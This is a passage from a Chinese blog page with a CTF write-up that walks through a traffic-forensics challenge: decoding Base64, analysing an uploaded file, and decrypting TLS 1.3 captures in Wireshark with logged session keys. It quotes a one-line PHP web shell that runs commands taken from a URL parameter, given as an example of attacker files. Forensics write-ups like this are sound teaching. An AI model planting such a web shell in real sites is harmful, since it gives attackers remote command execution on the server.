+<h3 id="情况-4：Base64-DNS-隐蔽传输"><a href="#情况-4：Base64-DNS-隐蔽传输" class="headerlink" title="情况 4：Base64/DNS 隐蔽传输"></a><strong>情况 4：Base64/DNS 隐蔽传输</strong></h3><ol>
+<li><p>提取 <strong>Base64 部分</strong>（如 <code>aGVsbG8=</code>）。</p>
+</li>
+<li><p>用 Python 解码：</p>
+<p> python</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">print(base64.b64decode("aGVsbG8="))  # 输出 b'hello'</span><br></pre></td></tr></tbody></table></figure></li>
+</ol>
+<hr>
+<h2 id="步骤-4：分析文件"><a href="#步骤-4：分析文件" class="headerlink" title="步骤 4：分析文件"></a><strong>步骤 4：分析文件</strong></h2><ul>
+<li><p>如果是 <strong>Web Shell</strong>（如 <code>.jsp</code>、<code>.php</code>），可能包含：</p>
+<p>  php</p>
+  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET["cmd"]); ?&gt;</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>如果是 <strong>Java 类</strong>，可能包含 <strong>恶意代码</strong>（如反弹 Shell）。</p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<h2 id="3-如何使用它们解密流量？"><a href="#3-如何使用它们解密流量？" class="headerlink" title="3. 如何使用它们解密流量？"></a><strong>3. 如何使用它们解密流量？</strong></h2><h3 id="方法-1：Wireshark-解密（推荐）"><a href="#方法-1：Wireshark-解密（推荐）" class="headerlink" title="方法 1：Wireshark 解密（推荐）"></a><strong>方法 1：Wireshark 解密（推荐）</strong></h3><ol>
+<li><p><strong>保存密钥到文件</strong>（如 <code>tls-keys.log</code>），格式：</p>
+<p> text</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET &lt;hex-id&gt; &lt;key&gt;</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET &lt;hex-id&gt; &lt;key&gt;</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 &lt;hex-id&gt; &lt;key&gt;</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 &lt;hex-id&gt; &lt;key&gt;</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><strong>配置 Wireshark</strong>：</p>
+<ul>
+<li><code>Edit</code> → <code>Preferences</code> → <code>Protocols</code> → <code>TLS</code></li>
+<li>在 <code>(Pre)-Master-Secret log filename</code> 指定 <code>tls-keys.log</code>。</li>
+</ul>
+</li>
+<li><p><strong>加载抓包文件（<code>.pcap</code>）</strong>，Wireshark 会自动解密 TLS 流量。</p>
+</li>
+</ol>
+</blockquote>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezDecryption"><a href="#ezDecryption" class="headerlink" title="ezDecryption"></a>ezDecryption</h3>
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8CTF/" rel="tag">磐石行动CTF</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="Unphishable防钓鱼攻防挑战" class="lazyload">
+          
+        
+        <a href="/2025/08/10/unphishable-fang-diao-yu-gong-fang-tiao-zhan/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            Unphishable防钓鱼攻防挑战
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="Web3 实习计划 - 2025 夏季" class="lazyload">
+        
+      
+      <a href="/2025/08/04/web3-shi-xi-ji-hua-2025-xia-ji/"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          Web3 实习计划 - 2025 夏季
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2024-2025
+      
+      <span class="footer-info-sep "></span>
+      mX1@0
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        286.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        17:52
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8CTFWP"><span class="toc-text">磐石行动CTFWP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#derderjia"><span class="toc-text">derderjia</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-text">1. 这是什么攻击？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">2. 攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">(1) 攻击者构造恶意字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Log4j-%E8%A7%A3%E6%9E%90%E6%81%B6%E6%84%8F%E6%97%A5%E5%BF%97"><span class="toc-text">(2) Log4j 解析恶意日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84-LDAP"><span class="toc-text">(3) 服务器连接攻击者的 LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-text">(4) 服务器执行恶意代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F"><span class="toc-text">步骤 1：确认攻击流量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">步骤 2：查找文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E6%A3%80%E6%9F%A5-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-text">方法 1：检查 HTTP 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E6%A3%80%E6%9F%A5-FTP-TFTP-SMB"><span class="toc-text">方法 2：检查 FTP&#x2F;TFTP&#x2F;SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E6%A3%80%E6%9F%A5-LDAP-JNDI-%E5%93%8D%E5%BA%94"><span class="toc-text">方法 3：检查 LDAP&#x2F;JNDI 响应</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-4%EF%BC%9A%E6%A3%80%E6%9F%A5-DNS-%E9%9A%90%E8%94%BD%E9%80%9A%E9%81%93"><span class="toc-text">方法 4：检查 DNS 隐蔽通道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">步骤 3：提取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-1%EF%BC%9AHTTP-%E4%B8%8A%E4%BC%A0"><span class="toc-text">情况 1：HTTP 上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-2%EF%BC%9AFTP-TFTP-%E4%B8%8A%E4%BC%A0"><span class="toc-text">情况 2：FTP&#x2F;TFTP 上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-3%EF%BC%9ALDAP-%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-text">情况 3：LDAP 返回恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E5%86%B5-4%EF%BC%9ABase64-DNS-%E9%9A%90%E8%94%BD%E4%BC%A0%E8%BE%93"><span class="toc-text">情况 4：Base64&#x2F;DNS 隐蔽传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-4%EF%BC%9A%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6"><span class="toc-text">步骤 4：分析文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%AE%83%E4%BB%AC%E8%A7%A3%E5%AF%86%E6%B5%81%E9%87%8F%EF%BC%9F"><span class="toc-text">3. 如何使用它们解密流量？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9AWireshark-%E8%A7%A3%E5%AF%86%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">方法 1：Wireshark 解密（推荐）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezDecryption"><span class="toc-text">ezDecryption</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">55</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">65</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "mX1@0",
+          title: "磐石行动CTFWP",
+          url: "http://example.com/2025/08/06/pan-shi-xing-dong-ctfwp/",
+          excerpt: "",
+          description: "",
+          stripContent: "磐石行动CTFWPMISCderderjia 题目：该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。  1、拿到一个derderjia.pcapng，导出所有对象，有一个文件中包含TLS 1.3 会话密钥   2、将其导入wireshark的TLS配置中，这样就可以解密TLS的密文   3、追踪TLS流，发现有一个文件上传的数据包   4、将该数据包以原始数据的格式保存到本地，然后删除数据包的首尾，只保留数据本身，发现是PK开头，是一个ZIP数据",
+          date: "Wed Aug 06 2025 12:07:47 GMT+0800",
+          updated: "Wed Aug 20 2025 23:36:38 GMT+0800",
+          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
